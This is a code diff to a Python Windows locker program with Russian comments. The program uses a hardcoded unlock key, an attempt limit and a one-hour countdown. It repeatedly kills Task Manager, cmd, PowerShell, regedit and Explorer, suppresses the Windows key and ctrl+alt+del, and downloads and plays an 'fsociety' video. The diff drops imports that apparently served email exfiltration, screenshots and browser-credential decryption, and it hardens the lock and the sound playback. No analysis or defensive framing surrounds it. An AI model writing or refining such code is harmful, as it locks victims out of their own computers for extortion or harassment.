@@ -7,15 +7,8 @@ try:
 except: pass
 
 import os, sys, time, threading, tempfile, tkinter as tk
-from tkinter import PhotoImage
-import urllib.request, smtplib, socket, base64, random, re, json
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
+import urllib.request, ctypes, winreg, shutil, random, re
 import cv2, numpy as np
-from PIL import ImageGrab
-import sqlite3, win32crypt, shutil, winreg, ctypes
 
 KEY = "1601"
 MAX_ATTEMPTS = 5
@@ -41,10 +34,6 @@ def kill_taskmgr_ultimate():
         try:
             for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe","explorer.exe"]:
                 run_hidden(f"taskkill /f /im {p}")
-            try:
-                hwnd = ctypes.windll.user32.FindWindowW(None, "Task Manager")
-                if hwnd: ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
-            except: pass
         except: pass
         time.sleep(0.005)
 
@@ -62,7 +51,9 @@ def disable_win_key():
     except: pass
     try:
         import keyboard
-        keyboard.block_key('windows'); keyboard.block_key('left windows'); keyboard.block_key('right windows')
+        for k in ['windows','left windows','right windows','win','lwin','rwin']:
+            try: keyboard.block_key(k)
+            except: pass
         for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+ctrl+d','win+ctrl+f4','win+1','win+2','win+3','win+4','win+5','win+6','win+7','win+8','win+9','win+0','win+b','win+i','win+k','win+p','win+q','win+shift+s','ctrl+shift+esc','ctrl+alt+del']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
@@ -83,14 +74,9 @@ def get_timer():
             with open(TIMER_FILE, 'r') as f: return float(f.read().strip())
     except: pass
     end_time = time.time() + 3600
-    save_timer(end_time)
+    os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
+    with open(TIMER_FILE, 'w') as f: f.write(str(end_time))
     return end_time
-
-def save_timer(end_time):
-    try:
-        os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
-        with open(TIMER_FILE, 'w') as f: f.write(str(end_time))
-    except: pass
 
 def timer_check_loop():
     while True:
@@ -173,17 +159,40 @@ def anim_fsociety():
 def play_video():
     if not download_file(VIDEO_URL, VIDEO_PATH): return
     time.sleep(0.3)
+    
+    # ЗВУК
+    sound_started = False
+    
+    # Способ 1: ffplay
     try:
-        # Звук
+        subprocess.Popen(['ffplay', '-nodisp', '-autoexit', '-loglevel', 'quiet', VIDEO_PATH], 
+                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        sound_started = True
+    except: pass
+    
+    # Способ 2: pygame
+    if not sound_started:
         try:
-            subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', VIDEO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
-        except:
-            try:
-                import pygame; pygame.mixer.init()
-                pygame.mixer.music.load(VIDEO_PATH); pygame.mixer.music.play()
-            except: pass
-        
-        # Видео
+            import pygame
+            pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
+            pygame.mixer.music.load(VIDEO_PATH)
+            pygame.mixer.music.set_volume(1.0)
+            pygame.mixer.music.play()
+            sound_started = True
+        except: pass
+    
+    # Способ 3: Windows Media Player
+    if not sound_started:
+        try:
+            subprocess.Popen(['wmplayer', VIDEO_PATH, '/play', '/close'], 
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            sound_started = True
+        except: pass
+    
+    # ВИДЕО
+    try:
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
             fps = cap.get(cv2.CAP_PROP_FPS)
@@ -198,8 +207,9 @@ def play_video():
             cap.release()
         cv2.destroyAllWindows()
         for _ in range(10): cv2.waitKey(1)
-        try: pygame.mixer.music.stop()
-        except: pass
+    except: pass
+    
+    try: pygame.mixer.music.stop()
     except: pass
 
 class Updater:
